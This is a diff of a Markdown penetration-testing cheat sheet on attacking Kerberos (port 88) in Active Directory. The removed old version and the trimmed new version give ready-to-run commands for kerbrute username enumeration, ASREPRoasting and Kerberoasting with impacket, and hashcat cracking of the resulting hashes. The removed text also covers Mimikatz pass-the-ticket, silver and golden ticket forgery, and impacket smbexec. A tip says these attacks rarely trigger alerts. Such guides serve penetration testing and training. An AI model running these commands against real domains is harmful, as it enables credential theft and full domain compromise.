@@ -1,113 +1,51 @@
-```table-of-contents
-```
+# Kerberos (88)
 
 !!! tip "Start here"
-    Enumerate valid usernames without credentials: `kerbrute userenum -d <domain> --dc <target> userlist.txt`. Then immediately try ASREPRoasting against those users: `GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <target>` — accounts without pre-auth required hand you crackable hashes with no password needed.
+    Port 88 open means you're looking at a domain controller. Start with username enumeration (no creds needed): `kerbrute userenum -d example.com --dc 10.10.10.10 userlist.txt`. Then immediately try ASREPRoasting — accounts without pre-auth required hand you crackable hashes.
+
+---
 
 ## Enumeration
-### Banner Grabbing
+
 ```bash
-nmap -p 88 -sV --script=krb5-enum-users,krb5-info <target-ip>
+nmap -p 88 --script krb5-enum-users 10.10.10.10
 ```
 
-If Kerberos is running on a Windows Server, the target is likely a **Domain Controller**.
-#### Enumerating the DC
-If LDAP is open (389), retrieve DC information:
+---
+
+## Username Enumeration
+
 ```bash
-ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com" | grep -i "dc="
+kerbrute userenum -d example.com --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 ```
-## Authentication Attacks
-### Enumerate Valid Usernames
+
+---
+
+## ASREPRoasting (No Credentials)
+
+Accounts with pre-authentication disabled return a crackable AS-REP hash without any password.
+
 ```bash
-./kerbrute userenum -d <domain> --dc <target-ip> userlist.txt
+GetNPUsers.py example.com/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat -outputfile asrep-hashes.txt
 ```
 
-Note: `kerbrute` file located in Cracks
-
-## Pre-Authentication Bruteforce (AS-REP Roasting)
-**ASREPRoasting** targets accounts with **Do not require Kerberos pre-authentication** enabled, allowing attackers to **extract AS-REP hashes** for offline cracking.
 ```bash
-GetNPUsers.py -dc-ip <target-ip> -usersfile userlist.txt -format hashcat <domain>/ -outputfile asrep-hashes.txt
+hashcat -m 18200 asrep-hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py
+---
 
-Cracking hashes:
+## Kerberoasting (Requires Valid Credentials)
+
+Request TGS tickets for accounts with SPNs — the encrypted tickets are crackable offline.
+
 ```bash
-hashcat -m 18200 asrep-hashes.txt /usr/share/wordlists/rockyou.txt --force
+GetUserSPNs.py example.com/<user>:<pass> -dc-ip 10.10.10.10 -request -outputfile tgs-tickets.txt
 ```
 
-### Check for AS-REP Roastable Accounts
-```powershell
-Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | Where-Object { $_.DoesNotRequirePreAuth -eq $true }
-```
-
-## Kerberoasting (Extracting TGS Tickets for Cracking)
-**Kerberoasting** exploits **misconfigured service accounts** to extract **TGS tickets**, which contain NTLM hashes crackable offline.
-### Enumerate Service Accounts
-```powershell
-Set-ExecutionPolicy Unrestricted
-Import-Module .\PowerView.ps1
-Get-NetUser -SPN
-```
-
-### Request a TGS Ticket
 ```bash
-GetUserSPNs.py -dc-ip <target-ip> <domain>/<user>:<password> -outputfile tgs-tickets.txt
+hashcat -m 13100 tgs-tickets.txt /usr/share/wordlists/rockyou.txt
 ```
 
-#### Cracking the Ticket hash using Hashcat
-```bash
-hashcat -m 13100 tgs-tickets.txt rockyou.txt --force
-```
-
-## Pass-the-Ticket (Using Captured TGT/TGS)
-If you obtain a TGT/TGS, use Mimikatz to inject and authenticate without knowing the password.
-### Extract and Inject a Ticket
-```bash
-mimikatz
-sekurlsa::tickets /export
-kerberos::ptt <ticket.kirbi>
-```
-Once injected, access the target service without credentials.
-
-## Silver Ticket Attack
-A Silver Ticket allows an attacker to forge TGS tickets for specific services.
-
-### Forge a Silver Ticket with Mimikatz
-```
-mimikatz
-kerberos::golden /domain:<domain> /sid:<SID> /target:<dc-ip> /service:cifs /rc4:<NTLM-hash>
-```
-A forged Silver Ticket grants persistent access to services like SMB, RDP, or MSSQL.
-
-## Golden Ticket Attack (Full Domain Control)
-A Golden Ticket allows an attacker to forge any Kerberos ticket and gain domain admin access.
-### Generate a Golden Ticket
-```
-mimikatz
-kerberos::golden /user:Administrator /domain:<domain> /sid:<domain-SID> /krbtgt:<NTLM-hash> /ticket:<golden-ticket.kirbi>
-```
-
-Once created, inject the ticket:
-```
-kerberos::ptt golden-ticket.kirbi
-```
-
-## Tools Quick Reference
-
-GetUserSPNs.py (Kerberoasting):
-```
-GetUserSPNs.py <DOMAIN>/<user>:<pass> -request -dc-ip <target-ip>
-```
-
-GetNPUsers.py (ASREPRoasting):
-```
-GetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <target-ip>
-```
-
-Pass-the-ticket (Impacket example)**:
-```
-export KRB5CCNAME=user.ccache 
-impacket-smbexec -k -no-pass <DOMAIN>/<user>@<target-ip>
-```
+!!! tip "Real-world"
+    ASREPRoasting is low-noise and requires zero credentials — run it as soon as you have a username list. Kerberoasting requires a foothold but is very effective against service accounts that haven't had their passwords rotated. Both attacks are noisy in event logs (4768/4769) but rarely alert on modern deployments unless specifically tuned.
